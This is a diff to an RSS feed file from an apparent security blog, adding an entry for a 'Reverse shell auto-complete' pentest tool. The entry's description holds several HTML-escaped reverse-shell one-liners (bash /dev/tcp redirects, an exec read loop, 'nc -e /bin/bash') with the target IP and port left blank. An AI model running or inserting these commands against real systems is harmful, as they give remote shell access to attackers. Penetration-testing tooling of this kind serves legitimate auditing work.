@@ -6,10 +6,19 @@
     <description>Recent content in Tools on Master 0xCcC</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>en-us</language>
-    <lastBuildDate>Thu, 03 Oct 2019 15:41:06 +0200</lastBuildDate>
+    <lastBuildDate>Sat, 05 Oct 2019 10:41:06 +0200</lastBuildDate>
     
 	<atom:link href="https://masterccc.github.io/tools/index.xml" rel="self" type="application/rss+xml" />
     
+    
+    <item>
+      <title>Reverse shell auto-complete</title>
+      <link>https://masterccc.github.io/tools/reverseshell/</link>
+      <pubDate>Sat, 05 Oct 2019 10:41:06 +0200</pubDate>
+      
+      <guid>https://masterccc.github.io/tools/reverseshell/</guid>
+      <description>.pre-wrapper{ position:relative; } .pre-wrapper pre{ padding-top: 25px; } .pre-wrapper .copy-snippet { border-radius: 0; min-width:55px; background: none repeat scroll 0 0 transparent; border: 1px solid #bbb; color: #26589F; font-family: &#39;HELEVETICA&#39;,sans-serif; font-size: 12px; font-weight: normal; line-height: 1.42rem; margin: 0; padding: 0px 5px; text-align: center; text-decoration: none; text-indent: 0; position:absolute; background:#ccc; top:0; left:0; } .pre-wrapper .copy-snippet:disabled{ color:#555; } Reverse shell auto-complete Auditor IP : Auditor Port : Generate Bash  bash -i &amp;#x3E;&amp;#x26; /dev/tcp// 0&amp;#x3E;&amp;#x26;1   exec 5&amp;#x3C;&amp;#x3E;/dev/tcp//;cat &amp;#x3C;&amp;#x26;5 | while read line; do $line 2&amp;#x3E;&amp;#x26;5 &amp;#x3E;&amp;#x26;5; done   exec /bin/sh 0&amp;#x3C;/dev/tcp// 1&amp;#x3E;&amp;#x26;0 2&amp;#x3E;&amp;#x26;0  Netcat  nc   -e /bin/bash   /bin/nc.</description>
+    </item>
     
     <item>
       <title>/bin/cat Shellcode generator</title>
